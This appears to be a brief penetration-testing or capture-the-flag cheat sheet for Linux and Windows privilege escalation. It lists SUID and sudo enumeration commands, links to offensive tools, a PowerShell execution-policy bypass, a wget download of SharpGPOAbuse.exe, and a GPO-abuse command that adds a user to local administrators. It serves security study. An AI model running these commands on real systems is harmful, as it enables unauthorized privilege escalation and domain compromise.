# Linux Privesc
- Find sudo permitted files
```sudo -l
```

- Find SUID binaries
```
find / -type f -perm -u=s 2>/dev/null
```

-Find SUID binaries
```
find / -type f -perm -4000 2>/dev/null
```

----------------------------------------------------------------------


# Window Privesc

## PrintSpoofer.exe
- Link
```
https://github.com/itm4n/PrintSpoofer
```

## JuicyPotato
- Link
```
https://github.com/ohpe/juicy-potato
```

## Powerup
- Link
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

powershell -ep bypass
.\PowerUp.ps1
Invoke-PrivescAudit
```

## Powerview
- Link
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

## SharpHound
- Link
```
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
```

## PowerGPOAbuse
- Link
```
https://github.com/rootSySdk/PowerGPOAbuse
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1
```
- Usage
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName 'noraj' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
```

## SharpGPOAbuse
- Link
```
wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe
```
